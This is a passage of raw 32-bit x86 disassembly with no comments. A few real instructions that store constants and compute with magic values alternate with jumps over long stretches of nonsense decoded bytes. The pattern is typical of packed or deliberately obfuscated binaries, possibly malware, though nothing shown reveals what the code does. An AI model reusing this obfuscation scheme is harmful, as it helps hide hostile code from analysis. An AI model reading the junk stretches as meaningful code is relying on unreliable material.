  41979e:	jne    0x41989d
  4197a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4197a7:	mov    ecx,DWORD PTR [ebp-0x30]
  4197aa:	sub    eax,0x4627
  4197af:	xor    edx,edx
  4197b1:	div    ecx
  4197b3:	mov    ecx,DWORD PTR [ebp-0x34]
  4197b6:	or     eax,0x1af1
  4197bb:	imul   eax,ecx
  4197be:	xor    eax,0x717886d
  4197c3:	add    eax,DWORD PTR ds:0x42f238
  4197c9:	mov    ds:0x42f240,eax
  4197ce:	jmp    0x41989d
  4197d3:	sar    al,cl
  4197d5:	test   DWORD PTR [esi-0x51],edx
  4197d8:	jg     0x4197ad
  4197da:	cld    
  4197db:	xchg   edx,eax
  4197dc:	out    dx,al
  4197dd:	mov    ebx,0x2b220533
  4197e2:	jp     0x41977b
  4197e4:	and    al,0x1
  4197e6:	add    BYTE PTR [edx-0x42000000],dh
  4197ec:	jne    0x41986b
  4197ee:	mov    ds:0xadc30345,al
  4197f3:	sbb    esi,esp
  4197f5:	imul   edx,DWORD PTR [edx+0x785ea15a],0x6b
  4197fc:	popa   
  4197fd:	and    eax,0x550c6ea4
  419802:	icebp  
  419803:	cmp    bh,BYTE PTR [eax-0x543c5ba8]
  419809:	retf   
  41980a:	add    DWORD PTR [esi-0xa],ebp
  41980d:	jae    0x4197bd
  41980f:	mov    esp,DWORD PTR [eax-0x79]
  419812:	xor    al,0xc7
  419814:	inc    ebp
  419815:	fwait
  419816:	nop
  419817:	and    dh,BYTE PTR [eax]
  419819:	ins    BYTE PTR es:[edi],dx
  41981a:	cs aad 0xcc
  41981d:	sti    
  41981e:	shl    BYTE PTR [ebp-0x65adaf7e],1
  419824:	mov    ah,0x94
  419826:	pop    es
  419827:	cmc    
  419828:	retf   0x62b8
  41982b:	jns    0x419894
  41982d:	ret    0xc153
  419830:	lahf   
  419831:	pop    ecx
  419832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419833:	mov    ah,0xbf
  419835:	ds int3 
  419837:	mov    dl,BYTE PTR [edx-0x72]
  41983a:	mov    dl,0xe8
  41983c:	sub    BYTE PTR [eax],ch
  41983e:	pop    edi
  41983f:	dec    esp
  419840:	fs jmp 0x73a2afcf
  419846:	mov    edx,0x422886b6
  41984b:	aas    
  41984c:	adc    DWORD PTR [esi],ebp
  41984e:	cli    
  41984f:	sub    DWORD PTR [esi],edx
  419851:	pop    eax
  419852:	in     eax,dx
  419853:	aas    
  419854:	shl    ebp,1
  419856:	sbb    ch,BYTE PTR [esp+0x1]
  41985a:	mov    bl,0x9
  41985c:	push   ecx
  41985d:	mov    ah,0x9f
  41985f:	mov    eax,0x29b45c15
  419864:	aam    0x3d
  419866:	imul   esp,DWORD PTR [edi],0x30
  419869:	ja     0x419885
  41986b:	mov    ss:0x2b2a4b3e,al
  419871:	mov    bl,0x23
  419873:	jle    0x419808
  419875:	jnp    0x419812
  419877:	test   al,0x5b
  419879:	dec    ecx
  41987a:	out    dx,eax
  41987b:	(bad)  
  41987c:	iret   
  41987d:	out    0x80,eax
  41987f:	gs cmp edx,edx
  419882:	mov    DWORD PTR [esp+ebx*2],esi
  419885:	loope  0x4198d7
  419887:	mov    dl,0x47
  419889:	adc    dl,BYTE PTR [esi-0x14bdac7]
  41988f:	hlt    
  419890:	cmp    ah,bl
  419892:	gs das 
  419894:	daa    
  419895:	jge    0x419915
  419897:	mov    dl,0x98
  419899:	js     0x4198ca
  41989b:	sahf   
  41989c:	add    BYTE PTR [esi-0x37],bl
  41989f:	ret    0x4
  4198a2:	push   ebp
  4198a3:	mov    ebp,esp
  4198a5:	sub    esp,0x68
  4198a8:	push   ebx
  4198a9:	push   esi
  4198aa:	push   edi
  4198ab:	mov    DWORD PTR [ebp-0x68],0x7ec6
  4198b2:	jmp    0x41997f
  4198b7:	inc    esi
  4198b8:	jae    0x41989a
  4198ba:	push   esi
  4198bb:	cmc    
  4198bc:	xlat   BYTE PTR ds:[ebx]
  4198bd:	div    BYTE PTR [ebx+0x48]
  4198c0:	je     0x419916
  4198c2:	in     al,0x24
  4198c4:	sub    DWORD PTR [eax],esp
  4198c6:	lahf   
  4198c7:	dec    ecx
  4198c8:	and    eax,0xb00001
  4198cd:	add    BYTE PTR [eax],al
  4198cf:	adc    al,0xa1
  4198d1:	add    dh,BYTE PTR [ebp+0x18]
  4198d4:	xchg   ecx,eax
  4198d5:	inc    edx
  4198d6:	jl     0x4198c5
  4198d8:	push   esp
  4198d9:	jbe    0x4198b7
  4198db:	dec    ecx
  4198dc:	push   es
  4198dd:	cmp    BYTE PTR [ebx-0x3d08b5c7],ah
  4198e3:	aaa    
  4198e4:	retf   
  4198e5:	rol    BYTE PTR [eax+0x33],0xf5
  4198e9:	bound  eax,QWORD PTR [edx+eax*1-0x44]
  4198ed:	hlt    
  4198ee:	fwait
  4198ef:	and    BYTE PTR [ebp+0x26],ch
  4198f2:	jge    0x41987f
  4198f4:	enter  0x72df,0xa9
  4198f8:	sbb    edx,DWORD PTR [edi-0xb1bd72c]
  4198fe:	fisttp WORD PTR [esi+0x30d2dc2d]
  419904:	push   ecx
  419905:	and    esi,DWORD PTR [edx]
  419907:	mov    esi,0x915f82c8
  41990c:	cdq    
  41990d:	mov    dh,0x94
  41990f:	mov    ebx,0xd8e5426e
  419914:	push   ds
  419915:	sub    al,0x96
  419917:	nop
  419918:	test   BYTE PTR [ebx+0x3b7429e3],0x4d
  41991f:	mov    ebp,0xc17ec087
  419924:	sub    DWORD PTR [edx+0x7e655093],0xeb2e5677
  41992e:	dec    ecx
  41992f:	call   0x24b5:0x724c99ae
  419936:	lods   al,BYTE PTR ds:[esi]
  419937:	dec    ebx
  419938:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41993a:	xchg   BYTE PTR [esi+0x53],ah
  41993d:	adc    eax,0x84fac73c
  419942:	fs stc 
  419944:	dec    edx
  419945:	inc    ecx
  419946:	mov    BYTE PTR [edi],bl
  419948:	out    0xe9,al
  41994a:	or     DWORD PTR [esi-0x3d00eda7],edx
  419950:	jno    0x419907
  419952:	xchg   BYTE PTR [eax],dh
  419954:	add    eax,ecx
  419956:	pop    eax
  419957:	push   edi
  419958:	jne    0x419933
  41995a:	shl    BYTE PTR [ebx-0x4c],cl
  41995d:	mov    dl,0x91
  41995f:	mov    ebp,0x4ee546b5
  419964:	mov    DWORD PTR [eax+edx*1-0x64],ecx
  419968:	inc    esi
  419969:	jbe    0x4199a3
  41996b:	(bad)  
  41996c:	push   ds
  41996d:	push   cs
  41996e:	pop    ds
  41996f:	retf   
  419970:	fwait
  419971:	lds    esi,FWORD PTR [ebp+0x6b]
  419974:	cmp    bh,BYTE PTR [edi+0x61]
  419977:	xor    BYTE PTR [esi],dl
  419979:	jo     0x419954
  41997b:	fwait
  41997c:	mov    ds:0x45c7918d,al
  419981:	pushf  
  419982:	bound  esi,QWORD PTR [esi+0x0]
  419985:	add    bh,al
  419987:	inc    ebp
  419988:	mov    al,ds:0x8aa1a1c7
  41998d:	mov    DWORD PTR [ebp-0x5c],0x0
  419994:	mov    DWORD PTR [ebp-0x58],0x2387
  41999b:	mov    DWORD PTR [ebp-0x54],0x255d
  4199a2:	mov    DWORD PTR [ebp-0x50],0x60b2
  4199a9:	mov    DWORD PTR [ebp-0x4c],0x2d17
  4199b0:	mov    DWORD PTR [ebp-0x48],0x35b0
  4199b7:	mov    DWORD PTR [ebp-0x44],0x59f4
  4199be:	mov    DWORD PTR [ebp-0x40],0x6476
  4199c5:	mov    DWORD PTR [ebp-0x3c],0x37f1
  4199cc:	mov    DWORD PTR [ebp-0x38],0x1fdb
  4199d3:	mov    DWORD PTR [ebp-0x34],0x349c
  4199da:	mov    DWORD PTR [ebp-0x30],0x44aa9dde
  4199e1:	jmp    0x419aae
  4199e6:	push   esp
  4199e7:	jbe    0x419a08
  4199e9:	int    0x3f
  4199eb:	in     eax,dx
  4199ec:	(bad)  
  4199ed:	(bad)  
  4199ee:	(bad)  [ecx+ebp*4]
  4199f1:	ret    
  4199f2:	dec    edx
  4199f3:	dec    esi
  4199f4:	mov    bl,0xa4
  4199f6:	stc    
  4199f7:	and    eax,0xb00001
  4199fc:	add    BYTE PTR [eax],al
  4199fe:	jns    0x419a47
  419a00:	mov    WORD PTR [edx+0x776136e3],?
  419a06:	call   0xde8:0xb74b824f
  419a0d:	(bad)  
  419a0f:	ret    
  419a10:	mov    edi,0x151ad0b0
  419a15:	aaa    
  419a16:	and    DWORD PTR [edx+0x14],ecx
  419a19:	out    dx,al
  419a1a:	adc    BYTE PTR [edi+0x53],0x6f
  419a1e:	jle    0x419a00
  419a20:	shr    DWORD PTR [edi+0x50baa074],0x5
  419a27:	xchg   edi,eax
  419a28:	scas   eax,DWORD PTR es:[edi]
  419a29:	call   0x4a0d:0xe3f5d7ca
  419a30:	inc    edx
  419a31:	in     eax,dx
  419a32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a33:	dec    ebx
  419a34:	leave  
  419a35:	mov    dl,0x8f
  419a37:	fistp  DWORD PTR [esp+edx*4-0x6bddea5e]
  419a3e:	nop
  419a3f:	test   eax,0x76308e6c
  419a44:	adc    BYTE PTR [edi+edi*2],0x92
  419a48:	xor    BYTE PTR [edx],ch
  419a4a:	jo     0x419a7c
  419a4c:	dec    ecx
  419a4d:	loop   0x419a5b
  419a4f:	adc    al,0x67
  419a51:	dec    ecx
  419a52:	pop    ebx
  419a53:	leave  
  419a54:	push   ecx
  419a55:	std    
  419a56:	scas   al,BYTE PTR es:[edi]
  419a57:	xchg   edi,eax
  419a58:	or     edi,0xffffffa0
  419a5b:	popa   
  419a5c:	adc    al,0x2e
  419a5e:	pusha  
  419a5f:	cld    
  419a60:	and    al,0x89
  419a62:	sar    bh,cl
  419a64:	add    eax,0xd98140c2
  419a69:	rcr    BYTE PTR [esp+ebx*4+0x4],cl
  419a6d:	inc    edi
  419a6e:	xor    ch,BYTE PTR [esi]
  419a70:	(bad)  
  419a71:	hlt    
  419a72:	ret    
  419a73:	fist   DWORD PTR [edi+0x3c5debe5]
  419a79:	sbb    edi,DWORD PTR [edi-0x7f43dfcb]
  419a7f:	test   BYTE PTR [ebx],0x38
  419a82:	loope  0x419a0e
  419a84:	enter  0xb46f,0xd0
  419a88:	mov    dh,0xd1
  419a8a:	iret   
  419a8b:	add    ch,BYTE PTR [ecx-0x25]
  419a8e:	mov    ds:0x96a9a53c,eax
  419a93:	pop    ecx
  419a94:	mov    esp,DWORD PTR [edi+0x62dc0e6b]
  419a9a:	jmp    0x419ada
  419a9c:	ss fs ss inc esp
  419aa0:	outs   dx,DWORD PTR ds:[esi]
  419aa1:	pop    ecx
  419aa2:	enter  0xb57e,0xd
  419aa6:	aas    
  419aa7:	jle    0x419a9f
  419aa9:	mov    ebp,0x655fb520
  419aae:	mov    DWORD PTR [ebp-0x2c],0x1
  419ab5:	jmp    0x419b82
  419aba:	loop   0x419ab5
  419abc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419abd:	retf   0xdebf
  419ac0:	out    dx,eax
  419ac1:	stc    
  419ac2:	mov    ch,BYTE PTR [esi-0x51072138]
  419ac8:	nop
  419ac9:	pop    gs
  419acb:	add    DWORD PTR es:[eax],eax
  419ace:	mov    al,0x0
  419ad0:	add    BYTE PTR [eax],al
  419ad2:	push   ss
  419ad3:	mov    ebp,0x14f035c3
  419ad8:	inc    ecx
  419ad9:	imul   esp,DWORD PTR [eax-0x65],0xfffffffb
  419add:	iret   
  419ade:	imul   ebp,DWORD PTR [ecx],0xb0d0f479
  419ae4:	push   esi
  419ae5:	test   BYTE PTR [ecx],0xd8
  419ae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ae9:	adc    al,0x6e
  419aeb:	(bad)  
  419aec:	add    al,0x40
  419aee:	cmp    al,0xf9
  419af0:	jp     0x419af5
  419af2:	(bad)  
  419af4:	mov    ebx,0x35452d8a
  419af9:	iret   
  419afa:	mov    eax,DWORD PTR [esi]
  419afc:	icebp  
  419afd:	xchg   esp,eax
  419afe:	or     al,0xd6
  419b00:	add    al,0xe7
  419b02:	icebp  
  419b03:	test   eax,0xe192c088
  419b08:	inc    esi
  419b09:	out    dx,al
  419b0a:	popf   
  419b0b:	cmp    eax,DWORD PTR [edx-0x7b]
  419b0e:	push   esp
  419b0f:	mov    eax,ds:0xabc4562
  419b14:	pop    di
  419b16:	outs   dx,BYTE PTR ds:[esi]
  419b17:	(bad)  
  419b18:	sub    al,0x63
  419b1a:	mov    ss,WORD PTR [ebp+0x54]
  419b1d:	cdq    
  419b1e:	retf   
  419b1f:	(bad)  
  419b20:	imul   ebx,DWORD PTR [esi*8-0x302e631a],0x267b9b98
  419b2b:	and    eax,0x511238a9
  419b30:	int    0xda
  419b32:	out    0xbf,al
  419b34:	push   ds
  419b35:	mov    edi,DWORD PTR gs:[edi-0x53fcda7a]
  419b3c:	out    0x22,al
  419b3e:	mov    eax,ds:0x85ca4281
  419b43:	push   0xeae265e8
  419b48:	dec    edi
  419b49:	mov    cl,0x73
  419b4b:	inc    edi
  419b4c:	xor    eax,DWORD PTR [eax+0x1d]
  419b4f:	jo     0x419b92
  419b51:	bound  esp,QWORD PTR [edi]
  419b53:	jecxz  0x419b01
  419b55:	lods   al,BYTE PTR ds:[esi]
  419b56:	mov    ds:0x476cc9e1,eax
  419b5b:	fyl2x  
  419b5d:	ins    DWORD PTR es:[edi],dx
  419b5e:	std    
  419b5f:	lea    edx,[edi]
  419b61:	cs mov esi,0x58ce163d
  419b67:	xor    ch,BYTE PTR [edx-0x269aa470]
  419b6d:	adc    eax,0x33e5528
  419b72:	pop    es
  419b73:	mov    edx,0xe4e60c66
  419b78:	sbb    edx,DWORD PTR fs:[eax+0x1f91e94e]
  419b7f:	mov    WORD PTR [edi+0x38],?
  419b82:	mov    DWORD PTR [ebp-0x28],0x62df
  419b89:	mov    DWORD PTR [ebp-0x24],0x65f0
  419b90:	mov    DWORD PTR [ebp-0x20],0x14f4
  419b97:	mov    DWORD PTR [ebp-0x1c],0x7cdc
  419b9e:	mov    DWORD PTR [ebp-0x18],0x2101
  419ba5:	jmp    0x419c72
  419baa:	adc    edi,DWORD PTR [edx+0x7def01c6]
  419bb0:	xlat   BYTE PTR ds:[ebx]
  419bb1:	mov    edx,0x4eee50a5
  419bb6:	aad    0x51
  419bb8:	(bad)  
  419bb9:	in     al,0x59
  419bbb:	daa    
  419bbc:	add    DWORD PTR [eax],eax
  419bbe:	mov    al,0x0
  419bc0:	add    BYTE PTR [eax],al
  419bc2:	pop    ds
  419bc3:	sbb    eax,0x2fa459b1
  419bc8:	fs hlt 
  419bca:	mov    ah,0x3a
  419bcc:	push   0x4a8afd82
  419bd1:	mov    bl,BYTE PTR [edx]
  419bd3:	fs dec ebp
  419bd5:	jmp    DWORD PTR [ecx+0xc]
  419bd8:	or     al,BYTE PTR [ebx+0x157cbae3]
  419bde:	push   edx
  419bdf:	mov    esi,0xeec163a4
  419be4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419be5:	cmp    ebp,DWORD PTR [ebp+0x35]
  419be8:	test   eax,0x5e7305d9
  419bed:	es ja  0x419c67
  419bf0:	jno    0x419bc0
  419bf2:	jne    0x419c09
  419bf4:	fwait
  419bf5:	mov    eax,DWORD PTR [edi-0x280662dc]
  419bfb:	mov    ds:0xadf9aff6,al
  419c00:	dec    edi
  419c01:	test   eax,0x9668e4ea
  419c06:	xlat   BYTE PTR ds:[ebx]
  419c07:	out    dx,al
  419c08:	or     al,0x35
  419c0a:	sub    ch,ah
  419c0c:	jp     0x419ba9
  419c0e:	gs aaa 
  419c10:	lods   al,BYTE PTR ds:[esi]
  419c11:	lock mov dh,0x23
  419c14:	xchg   DWORD PTR [edi+eiz*8+0x4f46c71f],ebx
  419c1b:	push   ebp
  419c1c:	mov    DWORD PTR [ecx-0x42],esp
  419c1f:	and    edi,DWORD PTR cs:[ebx]
  419c22:	js     0x419bfa
  419c24:	nop
  419c25:	jle    0x419c9b
  419c27:	imul   edi,DWORD PTR [esi],0x5
  419c2a:	sbb    eax,0x177fd3e0
  419c2f:	in     eax,0x22
  419c31:	les    ebx,FWORD PTR [ebx]
  419c33:	inc    ecx
  419c34:	fnsave [ebp+0x3cd2a02c]
  419c3a:	and    eax,0xe9ff191b
  419c3f:	add    esi,DWORD PTR [edx]
  419c41:	cmp    al,0xc7
  419c43:	shl    BYTE PTR [ebp+0x0],cl
  419c46:	sub    DWORD PTR [esi],ecx
  419c48:	inc    ecx
  419c49:	(bad)  
  419c4a:	mov    ch,cl
  419c4c:	out    dx,al
  419c4d:	leave  
  419c4e:	hlt    
  419c4f:	adc    DWORD PTR [ecx-0x52e68029],edi
  419c55:	rol    dh,cl
  419c57:	hlt    
  419c58:	scas   al,BYTE PTR es:[edi]
  419c59:	mov    eax,0x3cd0edbb
  419c5e:	push   cs
  419c5f:	sub    eax,ebp
  419c61:	push   es
  419c62:	mov    ecx,0x1856fd93
  419c67:	mov    cl,dh
  419c69:	push   edx
  419c6a:	setp   cl
  419c6d:	adc    edx,0x4
  419c70:	inc    esp
  419c71:	je     0x419c3a
  419c73:	inc    ebp
  419c74:	in     al,dx
  419c75:	ins    BYTE PTR es:[edi],dx
  419c76:	dec    eax
  419c77:	add    BYTE PTR [eax],al
  419c79:	jmp    0x419d46
  419c7e:	sbb    eax,0xc527c558
  419c83:	mov    edi,0xcca87aff
  419c88:	and    DWORD PTR [ebx+edi*8+0x9e4bac3],0xb0000128
  419c93:	add    BYTE PTR [eax],al
  419c95:	add    BYTE PTR [eax],al
  419c97:	out    dx,al
  419c98:	mov    dl,0x90
  419c9a:	repnz aaa 
  419c9c:	xor    DWORD PTR [edi+0x4c935328],0xcc56a9a2
  419ca6:	daa    
  419ca7:	stos   BYTE PTR es:[edi],al
  419ca8:	jbe    0x419cd4
  419caa:	sahf   
  419cab:	inc    edx
  419cac:	mov    ebp,0x39fe5120
  419cb1:	mov    esp,0x9fe7ae6
  419cb6:	out    0x7c,al
  419cb8:	sbb    edi,DWORD PTR [eax+0xe]
  419cbb:	iret   
  419cbc:	or     BYTE PTR [ebp-0x45],al
  419cbf:	sti    
  419cc0:	icebp  
  419cc1:	inc    edi
  419cc2:	call   0xd2db:0xef61cc5c
  419cc9:	test   eax,0xbc79e87b
  419cce:	push   es
  419ccf:	stos   DWORD PTR es:[edi],eax
  419cd0:	lds    edi,FWORD PTR es:[ecx+0x3d54aa97]
  419cd7:	mov    ebx,0xc0ca04b8
  419cdc:	sub    eax,0x1de2434
  419ce1:	xchg   esp,eax
  419ce2:	pop    ss
  419ce3:	or     eax,0x108ed68c
  419ce8:	add    DWORD PTR [esi+0xb8fcd90],esi
  419cee:	dec    eax
  419cef:	sbb    DWORD PTR [eax+0x3e],edi
  419cf2:	or     BYTE PTR ds:0x431e7366,ah
  419cf8:	push   esp
  419cf9:	js     0x419d67
  419cfb:	gs out 0x79,eax
  419cfe:	push   es
  419cff:	mov    ah,0xf6
  419d01:	pop    ebp
  419d02:	je     0x419d3e
  419d04:	bound  edi,QWORD PTR [esi]
  419d06:	sbb    BYTE PTR [eax-0x65],cl
  419d09:	inc    esi
  419d0a:	adc    BYTE PTR [ebx],cl
  419d0c:	iret   
  419d0d:	xchg   BYTE PTR [ebx],cl
  419d0f:	cld    
  419d10:	(bad)  [ecx]
  419d12:	jae    0x419cc9
  419d14:	stc    
  419d15:	mov    DWORD PTR [esi+edx*4-0x51],ebx
  419d19:	mov    ah,0x8c
  419d1b:	xor    eax,0xc2e64322
  419d20:	dec    ebp
  419d21:	gs scas eax,DWORD PTR es:[edi]
  419d23:	cwde   
  419d24:	jae    0x419d80
  419d26:	dec    ebx
  419d27:	xchg   edi,eax
  419d28:	push   ebx
  419d29:	leave  
  419d2a:	(bad)  
  419d2b:	sub    al,0x5e
  419d2d:	ins    DWORD PTR es:[edi],dx
  419d2e:	mov    ecx,0x5ae76cd7
  419d33:	mov    DWORD PTR [eax+0x3e],ecx
  419d36:	sbb    DWORD PTR [esi-0x6f794594],ebx
  419d3c:	adc    esp,DWORD PTR [esi+0x58]
  419d3f:	ret    
  419d40:	mov    ds:0x8a6863db,eax
  419d45:	mov    dh,0xc7
  419d47:	inc    ebp
  419d48:	lock jno 0x419d92
  419d4b:	add    BYTE PTR [eax],al
  419d4d:	jmp    0x419e1a
  419d52:	and    DWORD PTR [esi],ecx
  419d54:	fild   QWORD PTR [edi-0x1]
  419d57:	push   DWORD PTR [ecx+0x940154e]
  419d5d:	dec    esi
  419d5e:	shl    BYTE PTR [ecx+esi*8+0x128b94e],cl
  419d65:	add    BYTE PTR [eax+0x44000000],dh
  419d6b:	les    edx,FWORD PTR [ebx]
  419d6d:	xchg   esp,eax
  419d6e:	les    esi,FWORD PTR [eax+0xd]
  419d71:	push   cs
  419d72:	dec    ebp
  419d73:	lahf   
  419d74:	mov    ecx,0x60b62fd8
  419d79:	lods   al,BYTE PTR ds:[esi]
  419d7a:	mov    ?,WORD PTR ds:0x43192d76
  419d80:	into   
  419d81:	icebp  
  419d82:	inc    BYTE PTR [edi+0x45]
  419d85:	add    al,0x59
  419d87:	aam    0x12
  419d89:	xchg   edx,eax
  419d8a:	scas   al,BYTE PTR es:[edi]
  419d8b:	pop    eax
  419d8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d8d:	xor    esi,0x43
  419d90:	xchg   ecx,eax
  419d91:	inc    edx
  419d92:	cli    
  419d93:	ds imul sp,dx,0x65
  419d98:	call   0x84c53e3e
  419d9d:	mov    ebx,DWORD PTR [edi-0x35905568]
  419da3:	jmp    0x33fbc72c
  419da8:	add    DWORD PTR [edi+eax*1],ecx
  419dab:	jb     0x419d32
  419dad:	pushf  
  419dae:	dec    ebp
  419daf:	push   cs
  419db0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419db1:	and    DWORD PTR [ecx+0x24],esp
  419db4:	push   0xffffffaa
  419db6:	xlat   BYTE PTR ds:[ebx]
  419db7:	pop    ss
  419db8:	push   edx
  419db9:	das    
  419dba:	adc    al,0x28
  419dbc:	adc    al,0x7d
  419dbe:	jns    0x419dfe
  419dc0:	gs ret 
  419dc2:	sbb    al,0xac
  419dc4:	pop    es
  419dc5:	les    edx,FWORD PTR [edi]
  419dc7:	mov    bl,0x7e
  419dc9:	data16 repnz fist DWORD PTR [ecx]
  419dcd:	inc    esi
  419dce:	xor    eax,0xac5ea571
  419dd3:	pop    es
  419dd4:	xchg   DWORD PTR [eax],esp
  419dd6:	(bad)  
  419dd8:	stos   DWORD PTR es:[edi],eax
  419dd9:	hlt    
  419dda:	jl     0x419dd5
  419ddc:	dec    eax
  419ddd:	cmp    DWORD PTR [ecx+0x4f7a64f5],edi
  419de3:	xchg   edi,eax
  419de4:	and    al,0xde
  419de6:	mov    esi,0xfc354936
  419deb:	call   0xb64c5290
  419df0:	xchg   ebp,eax
  419df1:	inc    ebx
  419df2:	xchg   ebx,eax
  419df3:	xchg   edx,eax
  419df4:	(bad)  
  419df5:	call   0x39e2:0xbdd78e42
  419dfc:	sub    BYTE PTR [edi],bl
  419dfe:	retf   0xc603
  419e01:	fisttp QWORD PTR [ebx+0x62c61fe5]
  419e07:	loopne 0x419e23
  419e09:	sbb    DWORD PTR [ecx+0x7c8329d],eax
  419e0f:	xor    BYTE PTR [edx+0x7a],0x17
  419e13:	outs   dx,BYTE PTR ds:[esi]
  419e14:	in     eax,dx
  419e15:	scas   eax,DWORD PTR es:[edi]
  419e16:	imul   esi,DWORD PTR [eax],0x2b
  419e19:	sub    al,bh
  419e1b:	inc    ebp
  419e1c:	hlt    
  419e1d:	sub    esp,DWORD PTR [eax+eax*1]
  419e20:	add    cl,ch
  419e22:	enter  0x0,0x0
  419e26:	inc    eax
  419e27:	ds pop ss
  419e29:	fstp   TBYTE PTR [edi-0x5]
  419e2c:	int3   
  419e2d:	mov    edi,0xde140105
  419e32:	cmp    ecx,DWORD PTR [edx-0x23]
  419e35:	int    0x69
  419e37:	sub    DWORD PTR [ecx],eax
  419e39:	add    BYTE PTR [eax+0x70000000],dh
  419e3f:	cmp    esi,esi
  419e41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e42:	dec    esp
  419e43:	sub    edx,DWORD PTR [edi-0x296d5a54]
  419e49:	sub    BYTE PTR [edx+0x1b6d1f95],0x5b
  419e50:	pushf  
  419e51:	(bad)  
  419e52:	and    al,0xf1
  419e54:	adc    eax,0x12438e57
  419e59:	sti    
  419e5a:	xchg   DWORD PTR [ebx+0x3104c87],edx
  419e60:	shl    BYTE PTR [ecx+0x2b],0x68
  419e64:	fwait
  419e65:	les    eax,FWORD PTR [ebx-0x5092cf1f]
  419e6b:	loope  0x419ea3
  419e6d:	sbb    edx,ebp
  419e6f:	mov    cl,0x4e
  419e71:	xor    al,0xd8
  419e73:	push   0x75
  419e75:	fdivrp st(5),st
  419e77:	jbe    0x419dfd
  419e79:	inc    esp
  419e7a:	lods   eax,DWORD PTR ds:[esi]
  419e7b:	xchg   esi,eax
  419e7c:	or     al,0xb3
  419e7e:	push   eax
  419e7f:	xor    bl,al
  419e81:	imul   ecx,DWORD PTR [eax+esi*8],0xd4ec1fcd
  419e88:	cmp    ebp,DWORD PTR [esi+0x6fffaa3b]
  419e8e:	mov    ebp,0xdb382841
  419e93:	add    edi,DWORD PTR [ebp-0x76]
  419e96:	jo     0x419e4c
  419e98:	data16 or al,0xac
  419e9b:	in     al,dx
  419e9c:	sub    BYTE PTR [ebp-0x40],bl
  419e9f:	push   ebx
  419ea0:	sbb    eax,0xab98a68a
  419ea5:	jmp    0xb9c4:0x64134602
  419eac:	cmp    BYTE PTR [edx-0x44],0xa
  419eb0:	fwait
  419eb1:	repz and BYTE PTR [edx+0x5c3ebe08],0xfc
  419eb9:	push   0x1474a8f
  419ebe:	bound  edx,QWORD PTR [edx]
  419ec0:	mov    edi,DWORD PTR [bp+0x28]
  419ec4:	stc    
  419ec5:	xor    BYTE PTR [edx],al
  419ec7:	dec    ebx
  419ec8:	xchg   esp,eax
  419ec9:	dec    edi
  419eca:	adc    edx,DWORD PTR [ebx-0x730dd7d6]
  419ed0:	int    0x15
  419ed2:	cmp    BYTE PTR [eax+0x5a],bh
  419ed5:	sbb    DWORD PTR [ebp+0x32d999e2],esp
  419edb:	mov    ebp,0xf9bbbab6
  419ee0:	mov    eax,ds:0x37b59f7d
  419ee5:	pop    edi
  419ee6:	ficom  WORD PTR [edx-0x4cc15d67]
  419eec:	enter  0xc74e,0x45
  419ef0:	clc    
  419ef1:	je     0x419f32
  419ef3:	add    BYTE PTR [eax],al
  419ef5:	push   0xffffe9b2
  419efa:	jmp    0x419fc7
  419eff:	enter  0xf31f,0x88
  419f03:	imul   esp
  419f05:	sti    
  419f06:	pop    edi
  419f07:	add    bl,BYTE PTR [ebp+0x73db95fb]
  419f0d:	mov    al,ds:0x12a199f
  419f12:	add    BYTE PTR [eax-0x4d000000],dh
  419f18:	in     eax,0xf6
  419f1a:	sar    DWORD PTR [edx+0x5456309f],1
  419f20:	dec    esp
  419f21:	addr16 adc eax,0x44229a55
  419f27:	or     ah,bl
  419f29:	mov    dh,0xdb
  419f2b:	add    dh,dl
  419f2d:	mov    al,ds:0xcf9f81ff
  419f32:	lds    esp,FWORD PTR [eax]
  419f34:	and    edx,edx
  419f36:	push   edi
  419f37:	xor    DWORD PTR [ebp-0xf],edi
  419f3a:	cmp    bh,al
  419f3c:	push   eax
  419f3d:	or     al,0x55
  419f3f:	out    0x95,al
  419f41:	icebp  
  419f42:	and    eax,eax
  419f44:	test   al,0xd1
  419f46:	inc    BYTE PTR [ebx+ebx*4]
  419f49:	shl    BYTE PTR [ecx-0x66],0x55
  419f4d:	lea    edx,[edi-0x8640267]
  419f53:	pusha  
  419f54:	enter  0x8b2c,0x2b
  419f58:	jno    0x419f53
  419f5a:	gs inc edi
  419f5c:	call   0x80c:0x6338fd9a
  419f63:	jecxz  0x419fcb
  419f65:	jmp    0x419fc7
  419f67:	inc    esi
  419f68:	xor    al,0xbe
  419f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f6b:	or     eax,0x58467268
  419f70:	das    
  419f71:	mov    edx,0x2ba0758f
  419f76:	sbb    eax,0xd724caec
  419f7b:	push   ebp
  419f7c:	pop    esp
  419f7d:	push   0x48
  419f7f:	test   BYTE PTR [esi+0x45],0xee
  419f83:	jnp    0x419f4e
  419f85:	in     al,0xf6
  419f87:	mov    eax,0xba225b50
  419f8c:	shl    BYTE PTR [esi+0x4cef3ffd],0xce
  419f93:	ret    
  419f94:	mov    esi,0xd6667e18
  419f99:	mov    ds:0x92963162,eax
  419f9e:	pop    edx
  419f9f:	and    al,0x36
  419fa1:	pop    edi
  419fa2:	call   0xed2:0x9105fd17
  419fa9:	hlt    
  419faa:	xor    ecx,DWORD PTR ds:0x3842aa91
  419fb0:	lods   al,BYTE PTR ds:[esi]
  419fb1:	cld    
  419fb2:	popa   
  419fb3:	push   esi
  419fb4:	in     eax,0x8f
  419fb6:	leave  
  419fb7:	out    dx,eax
  419fb8:	mov    esi,eax
  419fba:	shl    BYTE PTR ds:0xd4a603b0,cl
  419fc0:	adc    BYTE PTR [edi+0xc],bl
  419fc3:	mov    esi,0xc74c2ae4
  419fc8:	inc    ebp
  419fc9:	cld    
  419fca:	jle    0x41a012
  419fcc:	add    BYTE PTR [eax],al
  419fce:	jmp    0x41a09b
  419fd3:	xor    al,0xab
  419fd5:	xchg   esp,eax
  419fd6:	outs   dx,DWORD PTR ds:[esi]
  419fd7:	lahf   
  419fd8:	jg     0x419fd9
  419fda:	sti    
  419fdb:	or     eax,0xff95a191
